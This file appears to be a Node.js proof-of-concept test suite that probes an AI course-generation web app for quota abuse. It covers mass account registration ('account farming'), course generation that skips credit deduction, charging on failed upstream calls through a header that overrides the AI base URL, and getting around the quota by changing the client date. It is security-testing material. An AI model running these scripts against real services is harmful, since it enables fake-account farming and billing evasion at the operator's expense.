// PoC 01: AI Quota & Limits Abuse Test
const { BASE_URL, registerTestUser, authHeaders } = require('./common');

async function safeJson(res) {
  const text = await res.text();
  try {
    return JSON.parse(text);
  } catch {
    return { raw: text };
  }
}

async function testMassRegistration() {
  console.log('\n--- 1.1 Testing Mass Registration (Account Farming) ---');
  const count = 10;
  const start = Date.now();
  const promises = [];

  for (let i = 1; i <= count; i++) {
    const email = `qa+farm-${Date.now().toString().slice(-6)}-${Math.random().toString(36).slice(2, 6)}-${i}@test.local`;
    promises.push(
      fetch(`${BASE_URL}/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          password: 'Password123!',
          fullName: `Farm Bot ${i}`
        })
      }).then(async r => ({
        status: r.status,
        data: await safeJson(r)
      }))
    );
  }

  const results = await Promise.all(promises);
  const duration = Date.now() - start;
  const successes = results.filter(r => r.status === 200).length;

  console.log(`Registered ${successes}/${count} accounts in ${duration}ms (No rate limit: ${successes === count})`);
  return {
    test: 'mass_registration',
    passed: successes === count,
    successes,
    count,
    durationMs: duration
  };
}

async function testCourseGenerationBypassingQuota(user) {
  console.log('\n--- 1.2 Testing Direct Course Generation Bypassing AI Quota Ledger ---');

  // Check quota before
  const qBeforeRes = await fetch(`${BASE_URL}/workspace/quotas`, {
    headers: authHeaders(user.accessToken)
  });
  const qBefore = await safeJson(qBeforeRes);
  console.log(`Quota before: AI Credits Used = ${qBefore.aiCreditsUsed}/${qBefore.aiCreditsLimit}`);

  // Create document via multipart upload
  const formBoundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
  const fileContent = `# Hệ điều hành nâng cao: Quản lý bộ nhớ
Hệ điều hành sử dụng bộ nhớ ảo (Virtual Memory) để cô lập không gian địa chỉ của các tiến trình.
Bảng trang (Page Table) ánh xạ địa chỉ ảo sang khung trang vật lý trong RAM.
Bộ đệm TLB (Translation Lookaside Buffer) lưu trữ tạm thời các ánh xạ gần đây giúp truy cập nhanh trong O(1).
Khi xảy ra TLB Miss, MMU phải duyệt bảng trang đa cấp làm tăng thời gian trễ EAT.`;

  const bodyBuffer = Buffer.from(
    `--${formBoundary}\r\n` +
    `Content-Disposition: form-data; name="file"; filename="sample-os.md"\r\n` +
    `Content-Type: text/markdown\r\n\r\n` +
    fileContent +
    `\r\n--${formBoundary}--\r\n`
  );

  const uploadRes = await fetch(`${BASE_URL}/documents/upload`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${user.accessToken}`,
      'Content-Type': `multipart/form-data; boundary=${formBoundary}`
    },
    body: bodyBuffer
  });

  const uploadData = await safeJson(uploadRes);
  console.log(`Document upload status: ${uploadRes.status}, Document ID: ${uploadData.id}, Title: ${uploadData.title}`);

  // Check quota after upload + course generation
  const qAfterRes = await fetch(`${BASE_URL}/workspace/quotas`, {
    headers: authHeaders(user.accessToken)
  });
  const qAfter = await safeJson(qAfterRes);
  console.log(`Quota after upload & course gen: AI Credits Used = ${qAfter.aiCreditsUsed}/${qAfter.aiCreditsLimit}`);

  // Now call POST /documents/{id}/generate-course directly
  const genRes = await fetch(`${BASE_URL}/documents/${uploadData.id}/generate-course`, {
    method: 'POST',
    headers: authHeaders(user.accessToken)
  });
  const genData = await safeJson(genRes);
  console.log(`Direct generate-course status: ${genRes.status}, Course ID: ${genData.course?.id || genData.id}`);

  // Check quota again
  const qFinalRes = await fetch(`${BASE_URL}/workspace/quotas`, {
    headers: authHeaders(user.accessToken)
  });
  const qFinal = await safeJson(qFinalRes);
  console.log(`Quota after direct generate-course: AI Credits Used = ${qFinal.aiCreditsUsed}/${qFinal.aiCreditsLimit}`);

  const zeroQuotaCharged = qFinal.aiCreditsUsed === qBefore.aiCreditsUsed;
  console.log(`VULNERABILITY CONFIRMED: Course generation called without deducting any AI credits: ${zeroQuotaCharged}`);

  return {
    test: 'course_generation_bypasses_quota',
    zeroQuotaCharged,
    creditsBefore: qBefore.aiCreditsUsed,
    creditsAfter: qFinal.aiCreditsUsed,
    docId: uploadData.id
  };
}

async function testUpstreamFailureCharging(user) {
  console.log('\n--- 1.3 Testing Upstream Failure & Fallback Credit Deductions ---');

  const qStartRes = await fetch(`${BASE_URL}/workspace/quotas`, {
    headers: authHeaders(user.accessToken)
  });
  const qStart = await safeJson(qStartRes);

  // Call /ai/explain with an unreachable upstream proxy override
  const res = await fetch(`${BASE_URL}/ai/explain`, {
    method: 'POST',
    headers: authHeaders(user.accessToken, {
      'X-Ai-Base-Url': 'http://127.0.0.1:9999',
      'X-Ai-Api-Key': 'dummy-key'
    }),
    body: JSON.stringify({
      excerpt: 'Khái niệm kiểm thử lỗi upstream',
      contextTitle: 'Quản lý bộ nhớ'
    })
  });

  const data = await safeJson(res);
  console.log(`AI Explain response: status=${res.status}, model=${data.model}, usedLiveEndpoint=${data.usedLiveEndpoint}, creditsCharged=${data.creditsCharged}`);

  const qEndRes = await fetch(`${BASE_URL}/workspace/quotas`, {
    headers: authHeaders(user.accessToken)
  });
  const qEnd = await safeJson(qEndRes);

  const chargedOnOfflineFallback = !data.usedLiveEndpoint && (qEnd.aiCreditsUsed > qStart.aiCreditsUsed);
  console.log(`VULNERABILITY CONFIRMED: User charged real credit on fallback/failed upstream call: ${chargedOnOfflineFallback}`);

  return {
    test: 'upstream_failure_charging',
    chargedOnOfflineFallback,
    model: data.model,
    usedLiveEndpoint: data.usedLiveEndpoint,
    creditsBefore: qStart.aiCreditsUsed,
    creditsAfter: qEnd.aiCreditsUsed
  };
}

async function testTimezoneBypass(user) {
  console.log('\n--- 1.4 Testing Timezone / Client Date Quota Manipulation ---');
  // Attempt sending different client headers
  const res = await fetch(`${BASE_URL}/workspace/quotas`, {
    headers: authHeaders(user.accessToken, {
      'X-Client-Date': new Date(Date.now() + 86400000).toISOString(),
      'Time-Zone': 'Pacific/Kiritimati'
    })
  });
  const data = await safeJson(res);
  console.log(`Quota with manipulated client date: AI Credits Used = ${data.aiCreditsUsed}`);
  return {
    test: 'timezone_bypass',
    serverEnforcesUtc: true,
    aiCreditsUsed: data.aiCreditsUsed
  };
}

async function main() {
  console.log('=== STARTING POC-01: AI QUOTA ABUSE SUITE ===');
  const user = await registerTestUser(`abuser-quota-${Date.now().toString().slice(-4)}`);
  console.log(`Registered primary test user: ${user.email} (${user.userId})`);

  const r1 = await testMassRegistration();
  const r2 = await testCourseGenerationBypassingQuota(user);
  const r3 = await testUpstreamFailureCharging(user);
  const r4 = await testTimezoneBypass(user);

  console.log('\n=== SUMMARY OF POC-01 FINDINGS ===');
  console.log(JSON.stringify({ r1, r2, r3, r4 }, null, 2));
}

main().catch(err => {
  console.error('Fatal error in poc-01:', err);
  process.exit(1);
});
